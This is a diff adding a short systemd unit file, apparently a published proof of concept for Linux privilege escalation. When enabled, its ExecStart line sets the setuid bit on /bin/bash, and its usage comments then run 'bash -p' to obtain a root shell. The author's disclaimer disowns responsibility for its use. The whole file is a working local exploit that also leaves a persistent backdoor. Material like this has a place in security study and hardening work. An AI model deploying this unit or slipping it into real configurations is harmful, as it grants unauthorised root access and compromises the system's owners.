@@ -1,0 +1,21 @@
+# A Service to elevate privileges of a normal user to root user provied that 'service' binary has the suid bit set.
+# Author: Anurag Mondal (7Ragnarok7)
+# Mail: 7Ragnarok7@pm.me
+# Github: https://github.com/7Ragnarok7/PoC/blob/main/Python/linux-priv-escalate.service
+
+# Usage: systemctl link linux-priv-escalate.service
+# systemctl enable --now linux-priv-escalate.service
+# /bin/bash -p
+# whoami
+
+# Disclaimer: I shall not be held responsible for whatsover you do with this tool.
+
+[Unit]
+Description=Linux Privilege Escalation Service
+
+[Service]
+ExecStart=/bin/sh -c 'chmod u+s /bin/bash'
+Type=oneshot
+
+[Install]
+WantedBy=multi-user.target
